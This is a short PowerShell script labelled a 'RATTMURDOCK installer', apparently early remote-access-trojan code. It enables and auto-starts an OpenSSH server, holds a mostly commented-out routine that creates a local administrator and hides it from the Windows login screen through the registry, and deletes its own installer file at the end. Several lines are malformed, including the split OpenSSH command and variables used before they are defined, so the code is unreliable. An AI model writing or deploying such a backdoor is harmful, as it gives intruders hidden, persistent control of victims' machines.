# this RATTMURDOCK installer file
# Created by : NinjaCat811


function Get-RandomString {
    param (
        [int]$length = 10  # Default length of the random string
    )
    # !@#$%^&*()-_=+[]{}|;:,.<>?
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $randomString = -join ((1..$length) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $randomString
}

# variables :   
$initial_path =  Get-Location
$temp_folder = $env:TEMP
$newFolderPath = Join-Path -Path $temp_folder -ChildPath $wrdir
$removedItemPath = Join-Path -Path $initial_path -ChildPath "installer.ps1"

do {
    $wrdir = Get-RandomString -length 25
    $newFolderPath = Join-Path -Path $temp_folder -ChildPath $wrdir
} until (-not (Test-Path $newFolderPath))

New-Item -Path $newFolderPath -ItemType Directory

Write-Output "New folder created: $newFolderPath"

#open ssh

Add-WindowsCapability -Online _name OpenSSH
Server ~~~~ 0.0.1.0
Start-Service sshd
Set-service _name sshd -StartupType 'Automatic'
Get-NetFireWallRule -name *ssh*

# #Make Hidden Local admin
# # Define username and password for the new admin user
# $username = "HiddenAdmin"
# $password = ConvertTo-SecureString "YourPasswordHere" -AsPlainText -Force

# # Create a new local user account
# New-LocalUser -Name $username -Password $password -FullName "Hidden Administrator" -Description "Hidden Local Administrator Account" -AccountNeverExpires

# # Add the new user to the local Administrators group
# Add-LocalGroupMember -Group "Administrators" -Member $username

# # Hide the new user from the login screen
# $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
# if (!(Test-Path $registryPath)) {
#     New-Item -Path $registryPath -Force | Out-Null
# }
New-ItemProperty -Path $registryPath -Name $username -Value 0 -PropertyType DWORD -Force | Out-Null




Remove-Item -Path $removedItemPath -Force





